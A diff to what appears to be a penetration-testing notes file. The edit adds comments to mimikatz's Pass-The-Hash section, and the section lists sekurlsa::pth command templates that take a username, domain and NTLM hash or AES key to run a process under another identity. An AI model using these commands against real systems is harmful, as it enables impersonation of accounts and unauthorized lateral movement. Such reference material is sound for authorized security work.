@@ -46,7 +46,9 @@ The Pass-The-Hash module of `mimikatz` can be used to locally run a process
 under another user identity using its `NTLM` hash:
 
 ```
-# Default to /run:cmd.exe
+# Default to /run:cmd.exe.
+# Command can be any binary such as powershell.exe or mmc.exe for example.
+# Specifying arguments is supported as well.
 sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN_FQDN> /ntlm:<HASH_NTLM> /run:<COMMAND>
 sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN_FQDN> [/aes128:<USER_AES128_KEY> | /aes256:<USER_AES256_KEY>] /run:<COMMAND>
 ```
